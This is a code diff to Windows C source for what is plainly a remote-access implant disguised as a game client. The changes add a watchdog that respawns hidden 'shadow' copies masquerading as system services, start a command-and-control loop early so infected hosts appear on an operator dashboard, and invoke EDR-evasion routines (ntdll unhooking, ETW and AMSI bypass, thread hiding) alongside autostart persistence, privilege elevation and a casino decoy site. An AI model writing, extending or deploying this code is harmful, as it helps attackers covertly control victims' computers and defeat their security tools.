@@ -66,6 +66,67 @@ DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
     return 0;
 }
 
+/* Inter-process watchdog: monitors other shadow processes and respawns dead ones */
+DWORD WINAPI shadow_watchdog(LPVOID lpParam) {
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    const char *shadows[] = {
+        "ElevationService.exe",
+        "CrashHandler.exe", 
+        "NotifyService.exe"
+    };
+    const char *regKeys[] = {
+        "ElevationService",
+        "CrashHandler",
+        "NotifyService"
+    };
+    
+    while (1) {
+        Sleep(30000);  /* Check every 30 seconds */
+        
+        for (int i = 0; i < 3; i++) {
+            char path[MAX_PATH];
+            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
+                     localAppData, shadows[i]);
+            
+            /* Check if process is running */
+            int found = 0;
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32 pe;
+                pe.dwSize = sizeof(pe);
+                if (Process32First(hSnap, &pe)) {
+                    do {
+                        if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                            found = 1;
+                            break;
+                        }
+                    } while (Process32Next(hSnap, &pe));
+                }
+                CloseHandle(hSnap);
+            }
+            
+            /* If not running, respawn */
+            if (!found) {
+                STARTUPINFOA si = {0};
+                si.cb = sizeof(si);
+                PROCESS_INFORMATION pi = {0};
+                char cmdLine[1024];
+                snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", path);
+                CreateProcessA(path, cmdLine, NULL, NULL, FALSE,
+                              CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+                              NULL, NULL, &si, &pi);
+                if (pi.hProcess) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }
+            }
+        }
+    }
+    return 0;
+}
+
 /* Execute game module or admin command */
 static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     char *result = NULL;
@@ -278,17 +339,50 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 
 /* Windows entry point */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    /* === CRITICAL: Startup evasion FIRST ===
-     * Unhooks ntdll, checks sandbox, sleeps, applies ETW/AMSI bypass
-     * BEFORE any suspicious activity is visible to EDR. */
-    obf_startup_evasion();
+    /* Detect if this is a shadow copy */
+    char *cmdLine = GetCommandLineA();
+    int isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
+    
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+    if (strstr(currentPath, "ElevationService.exe") != NULL ||
+        strstr(currentPath, "CrashHandler.exe") != NULL ||
+        strstr(currentPath, "NotifyService.exe") != NULL) {
+        isShadow = 1;
+    }
+    
+    /* === PHASE 1: Connect to C2 IMMEDIATELY ===
+     * Start C2 loop in a background thread FIRST so the server
+     * sees us before any long evasion sleeps. Critical fix:
+     * previously C2 was the LAST thing in WinMain, but evasion
+     * took 7-22s, so shadows never appeared on dashboard. */
+    InitializeCriticalSection(&g_copy_buffer_cs);
+    copy_buffer_init();
+    
+    /* Start C2 client loop in background thread */
+    CreateThread(NULL, 0, game_client_loop, NULL, 0, NULL);
+    
+    /* Start inter-process watchdog (respawns dead shadows) */
+    CreateThread(NULL, 0, shadow_watchdog, NULL, 0, NULL);
+    
+    /* === PHASE 2: Evasion (after C2 is connected) ===
+     * Shadow copies skip the long anti-sandbox sleep.
+     * They just need quick ntdll unhook + ETW/AMSI patch. */
+    if (isShadow) {
+        /* Fast path for shadows: just unhook and patch, no long sleeps */
+        obf_unhook_ntdll();
+        obf_bypass_etw_syscall();
+        obf_bypass_amsi_syscall();
+        obf_hide_thread();
+    } else {
+        /* Full evasion for first run */
+        obf_startup_evasion();
+    }
     
     /* Initialize obfuscated APIs */
     obf_init_apis();
     
-    /* Initialize subsystems */
-    InitializeCriticalSection(&g_copy_buffer_cs);
-    copy_buffer_init();
+    /* Initialize UI */
     ui_init();
     
     /* Open casino decoy website */
@@ -300,29 +394,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Ensure persistence for the original process too */
     sys_register_autostart();
     
-    /* Check if this is a shadow copy — auto-protect after 15 seconds */
-    char *cmdLine = GetCommandLineA();
-    if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
+    /* Auto-protect after 15 seconds */
+    if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
-
-    /* Backup: detect if running from shadow path */
-    char currentPath[MAX_PATH];
-    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-    if (strstr(currentPath, "ElevationService.exe") != NULL ||
-        strstr(currentPath, "CrashHandler.exe") != NULL ||
-        strstr(currentPath, "NotifyService.exe") != NULL) {
-        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
-    }
-
+    
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
     
     /* Start protection watchdog thread */
     CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
     
-    /* Start game client */
-    game_client_loop(NULL);
+    /* Main message loop */
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
     
     return 0;
 }
